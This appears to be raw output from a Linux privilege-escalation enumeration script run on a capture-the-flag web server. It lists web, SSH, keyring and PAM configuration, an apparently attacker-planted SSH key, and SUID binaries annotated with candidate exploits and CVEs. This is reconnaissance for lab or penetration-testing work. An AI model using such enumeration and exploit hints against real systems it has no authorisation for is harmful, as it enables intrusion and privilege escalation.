/etc/apache2/mods-available/php7.3.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php5.6.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php5.6.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php5.6.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php5.6.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php8.0.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php8.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php8.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php8.0.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jul  6  2021 /etc/apache2/sites-enabled                                                                                                                     
drwxr-xr-x 2 root root 4096 Jul  6  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Oct 15  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/Magic/
        <Directory /var/www/Magic/>
                Options FollowsymLinks
                AllowOverride all    
                Require all granted
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1448 Oct 22  2019 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/Magic/
        <Directory /var/www/Magic/>
                Options FollowsymLinks
                AllowOverride all    
                Require all granted
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Oct 15  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/Magic/
        <Directory /var/www/Magic/>
                Options FollowsymLinks
                AllowOverride all    
                Require all granted
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 74563 Sep  2  2019 /etc/php/5.6/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root root 74239 Sep  2  2019 /etc/php/5.6/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root root 71849 Feb 22  2020 /etc/php/7.3/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71461 Feb 22  2020 /etc/php/7.3/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72941 Feb 22  2020 /etc/php/7.4/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72539 Feb 22  2020 /etc/php/7.4/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72946 Jul  1  2021 /etc/php/8.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72544 Jul  1  2021 /etc/php/8.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 13  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 17  2020 /etc/NetworkManager/system-connections                                                                                                         
drwxr-xr-x 2 root root 4096 Mar 17  2020 /etc/NetworkManager/system-connections
-rw------- 1 root root 367 Mar 17  2020 /etc/NetworkManager/system-connections/Wired connection 1


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                    
drwxr-xr-x 2 root root 4096 Oct 15  2019 /etc/ldap

drwxr-xr-x 2 root root 32 Jan 23  2020 /snap/core18/1668/etc/ldap

drwxr-xr-x 2 root root 32 Jun 11  2021 /snap/core18/2074/etc/ldap

drwxr-xr-x 2 root root 32 Jan 24  2020 /snap/gnome-3-28-1804/116/etc/ldap

drwxr-xr-x 2 root root 32 Jun 28  2021 /snap/gnome-3-28-1804/161/etc/ldap

drwxr-xr-x 2 root root 32 Jun  8  2021 /snap/gnome-3-34-1804/72/etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                             
                                                                                                                                                                                        



-rw-rw-r-- 1 theseus theseus 113 Feb 23 10:31 /home/theseus/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIErzi80YYVjGdDF0K4f29cvtK3MTLy87WUNOXr6W5U3Y parallels@kali-gnu-linux-2023.2

-rw-r--r-- 1 root root 173 Oct 15  2019 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Oct 15  2019 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 393 Oct 15  2019 /etc/ssh/ssh_host_rsa_key.pub

Port 22
PasswordAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem                                                                                                                                                              
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
2727PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                          
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                        


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jul  6  2021 /etc/pam.d                                                                                                                                     
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3559 Apr 20  2021 /snap/core/11316/etc/cloud/cloud.cfg                                                                                                           
     lock_passwd: True
-rw-r--r-- 1 root root 3612 Dec  3  2019 /snap/core18/1668/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3559 May 11  2021 /snap/core18/2074/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3619 Apr 19  2021 /snap/core20/1026/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3517 Jan 16  2020 /snap/core/8689/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwx------ 2 theseus theseus 4096 Jul 12  2021 /home/theseus/.local/share/keyrings                                                                                                      
drwxr-xr-x 2 root root 121 Jun 15  2021 /snap/core/11316/usr/share/keyrings
drwxr-xr-x 2 root root 200 Jan 23  2020 /snap/core18/1668/usr/share/keyrings
drwxr-xr-x 2 root root 200 Jun 11  2021 /snap/core18/2074/usr/share/keyrings
drwxr-xr-x 2 root root 200 Apr 29  2021 /snap/core20/1026/usr/share/keyrings
drwxr-xr-x 2 root root 121 Feb 12  2020 /snap/core/8689/usr/share/keyrings
drwxr-xr-x 3 root root 4096 Jul  6  2021 /usr/lib/python3/dist-packages/keyrings
drwxr-xr-x 2 root root 4096 Jul  6  2021 /usr/share/keyrings

-rw------- 1 theseus theseus 105 Oct 21  2019 /home/theseus/.local/share/keyrings/login.keyring

-rw------- 1 theseus theseus 207 Oct 21  2019 /home/theseus/.local/share/keyrings/user.keystore


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                          
passwd file: /etc/passwd
passwd file: /snap/core/11316/etc/pam.d/passwd
passwd file: /snap/core/11316/etc/passwd
passwd file: /snap/core/11316/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/11316/var/lib/extrausers/passwd
passwd file: /snap/core18/1668/etc/pam.d/passwd
passwd file: /snap/core18/1668/etc/passwd
passwd file: /snap/core18/1668/usr/share/lintian/overrides/passwd
passwd file: /snap/core18/1668/var/lib/extrausers/passwd
passwd file: /snap/core18/2074/etc/pam.d/passwd
passwd file: /snap/core18/2074/etc/passwd
passwd file: /snap/core18/2074/usr/share/bash-completion/completions/passwd
passwd file: /snap/core18/2074/usr/share/lintian/overrides/passwd
passwd file: /snap/core18/2074/var/lib/extrausers/passwd
passwd file: /snap/core20/1026/etc/pam.d/passwd
passwd file: /snap/core20/1026/etc/passwd
passwd file: /snap/core20/1026/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1026/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1026/var/lib/extrausers/passwd
passwd file: /snap/core/8689/etc/pam.d/passwd
passwd file: /snap/core/8689/etc/passwd
passwd file: /snap/core/8689/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/8689/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                            
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                        
                                                                                                                                                                                        
-rw-r--r-- 1 root root 360 Oct 17  2019 /etc/apt/trusted.gpg.d/ondrej_ubuntu_php.gpg
-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 16295 Jun 15  2021 /snap/core/11316/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 14076 Jun  3  2020 /snap/core/11316/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Jun  3  2020 /snap/core/11316/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 Jun  3  2020 /snap/core/11316/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core18/1668/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core18/1668/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core18/1668/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core18/1668/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core18/1668/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core18/2074/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core18/2074/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core18/2074/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core18/2074/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core18/2074/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1026/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1026/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1026/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1026/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1026/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 13395 Feb 12  2020 /snap/core/8689/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 18  2012 /snap/core/8689/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18  2012 /snap/core/8689/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 18  2012 /snap/core/8689/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 21  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 theseus theseus 4096 Feb 23 10:48 /home/theseus/.gnupg
drwx------ 3 gdm gdm 4096 Jul  6  2021 /var/lib/gdm3/.gnupg


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/11316/usr/share/bash-completion/completions/postfix                                                                                  

-rw-r--r-- 1 root root 675 Apr  1  2018 /snap/core18/2074/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 813 Feb  1  2020 /snap/core20/1026/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/8689/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 675 Apr  1  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                                        


-rw-r--r-- 1 root root 69 Sep  2  2019 /etc/php/5.6/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Sep  2  2019 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Oct  7  2019 /etc/php/7.3/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Feb 22  2020 /etc/php/7.4/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jul  1  2021 /etc/php/8.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jul  1  2021 /usr/share/php5.6-common/common/ftp.ini
-rw-r--r-- 1 root root 69 Feb 22  2020 /usr/share/php7.0-common/common/ftp.ini
-rw-r--r-- 1 root root 69 Feb 22  2020 /usr/share/php7.4-common/common/ftp.ini
-rw-r--r-- 1 root root 69 Jul  1  2021 /usr/share/php8.0-common/common/ftp.ini






╔══════════╣ Analyzing Samba Files (limit 70)
-rw-r--r-- 1 root root 188 Mar 31  2018 /usr/share/doc/nautilus-share/examples/smb.conf                                                                                                 

╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  1  2018 /usr/share/bash-completion/completions/bind                                                                                                     
-rw-r--r-- 1 root root 856 Apr  1  2018 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                                                        





















lrwxrwxrwx 1 root root 20 Oct 18  2019 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Oct 18  2019 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Mar 13  2020 /var/lib/dpkg/alternatives/my.cnf




-rw-r--r-- 1 root root 516413 Feb 10  2018 /usr/share/gutenprint/5.2/xml/printers.xml

























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                                                              
-rw-r--r-- 1 theseus theseus 3771 Oct 15  2019 /home/theseus/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/11316/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Apr  4  2018 /snap/core18/1668/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Apr  4  2018 /snap/core18/2074/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1026/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/8689/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/11316/etc/skel/.profile
-rw-r--r-- 1 root root 807 Apr  4  2018 /snap/core18/1668/etc/skel/.profile
-rw-r--r-- 1 root root 807 Apr  4  2018 /snap/core18/2074/etc/skel/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1026/etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/8689/etc/skel/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                      
                      ╚════════════════════════════════════╝                                                                                                                            
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                        
-rwsr-xr-- 1 root dip 374K Feb 11  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                                             
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 22K Jun 28  2019 /usr/bin/arping
-rwsr-xr-x 1 root root 11K Dec  9  2019 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 10K Dec 18  2019 /usr/lib/xorg/Xorg.wrap
-rwsr-sr-x 1 root root 107K Oct 30  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 43K Sep 16  2020 /snap/core18/2074/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/2074/bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/2074/bin/su
-rwsr-xr-x 1 root root 27K Sep 16  2020 /snap/core18/2074/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/2074/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/2074/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/2074/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 22  2019 /snap/core18/2074/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 22  2019 /snap/core18/2074/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 146K Jan 19  2021 /snap/core18/2074/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2020 /snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /snap/core18/2074/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43K Aug 22  2019 /snap/core18/1668/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/1668/bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1668/bin/su
-rwsr-xr-x 1 root root 27K Aug 22  2019 /snap/core18/1668/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1668/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1668/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1668/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 22  2019 /snap/core18/1668/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 22  2019 /snap/core18/1668/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 146K Oct 10  2019 /snap/core18/1668/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core18/1668/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /snap/core18/1668/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 84K May 27  2020 /snap/core20/1026/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K May 27  2020 /snap/core20/1026/usr/bin/chsh
-rwsr-xr-x 1 root root 87K May 27  2020 /snap/core20/1026/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Jul 21  2020 /snap/core20/1026/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May 27  2020 /snap/core20/1026/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K May 27  2020 /snap/core20/1026/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K Jul 21  2020 /snap/core20/1026/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1026/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Jul 21  2020 /snap/core20/1026/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Jun 11  2020 /snap/core20/1026/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar  9  2021 /snap/core20/1026/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/11316/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11316/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11316/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11316/bin/su
-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/11316/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/11316/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11316/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/11316/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/11316/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/11316/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jan 20  2021 /snap/core/11316/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2020 /snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Jun  7  2021 /snap/core/11316/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 109K Jun 15  2021 /snap/core/11316/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
